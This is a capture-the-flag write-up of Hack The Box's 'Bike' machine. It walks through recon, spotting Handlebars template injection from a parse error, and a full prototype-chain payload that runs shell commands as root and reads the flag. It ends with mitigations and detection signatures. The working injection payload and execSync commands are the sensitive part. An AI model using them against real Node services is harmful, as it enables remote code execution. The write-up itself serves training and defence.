---
machine: Bike
os: Linux
difficulty: Very Easy
platform: Hack The Box
category: Starting Point
state: Available
pwned: 2026-11-10
tags: [web, ssti, nodejs, rce, tier1]
---

# Bike — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Available · Starting Point · Tier 1 · Linux · Very Easy

## TL;DR

A subscription form on **80/tcp** running **Node.js/Express + Handlebars**. The email is rendered as a template (`{{7*7}}` throws a Handlebars error) and the escape chain executes code **as root**. The flag is at `/root/flag.txt`.

---

## Recon

```bash
nmap -Pn -sV -p- --min-rate 1000 <TARGET_IP>
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4
80/tcp open  http    Node.js (Express middleware)
```

- **22/tcp** SSH with no credentials: ignored.
- **80/tcp** a Node app with Express and a single email form.

## Enumeration

```bash
curl -s http://<TARGET_IP>/ | grep -iE "form|input|contact"
```

The form sends `POST /` with `email=<value>` and echoes `We will contact you at: <value>`. Test whether the value is evaluated as a template:

```bash
curl -s -X POST http://<TARGET_IP>/ -d 'email={{7*7}}'
```

The response does not contain `49`: Handlebars does **not** evaluate arithmetic, but it throws a parse error that leaks the path:

```text
Error: Parse error on line 1:
... /root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/...
```

- Engine: **Handlebars**.
- App directory: `/root/Backend`, meaning the service runs **as root**.

## Foothold

Handlebars lets you reach the `Function` constructor through the prototype. Reference payload (PayloadsAllTheThings, Handlebars section):

```text
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

URL-encode it (Burp → Decoder) and send it in `email`:

```bash
curl -s -X POST http://<TARGET_IP>/ --data-urlencode "email=<URLENCODED_PAYLOAD>"
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

Swap the command for the flag read:

```text
return require('child_process').execSync('cat /root/flag.txt');
```

## Lateral movement

- Not applicable: the web process is already root on the only host.
- SSH remains a redundant path if persistence were needed.

## Privilege escalation

- Not applicable: there is **no escalation**, the RCE starts as root because the service was launched with that user.
- That is the real finding: an end-user service running as administrator.

## Evidence

- Handlebars error showing `/root/Backend`.
- `id` output as root and the flag redacted.

## Lessons learned

- `{{7*7}}` distinguishes engines: Twig/Jinja return `49`, Handlebars throws a parse error. That error also leaks paths.
- SSTI runs on the server: it is not XSS and never shows in client HTML.
- URL encoding is mandatory; the payload carries spaces, slashes and quotes.
- Running Node as root turns any RCE into full compromise.

## Mitigations and detection

**How to fix it:**

- Never pass user input as a template: use variables and `{{ }}` only for data.
- Escape/sanitise the email and validate it with a strict regex.
- Run the service as an unprivileged, isolated user (container, `systemd` hardening).
- WAF with SSTI signatures as an extra layer.

**How it would be detected:**

- Requests containing `{{`, `}}`, `${{` or `#{` in form fields.
- Template errors in application logs.
- Unexpected child processes (`sh`, `curl`, `cat`) spawned by the Node server.

- CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine
- OWASP Top 10 2021: A03 Injection
- MITRE ATT&CK: [T1190](https://attack.mitre.org/techniques/T1190/), [T1059.007](https://attack.mitre.org/techniques/T1059/007/)

## References

- [PayloadsAllTheThings — Server Side Template Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [HackTricks — SSTI (Handlebars)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
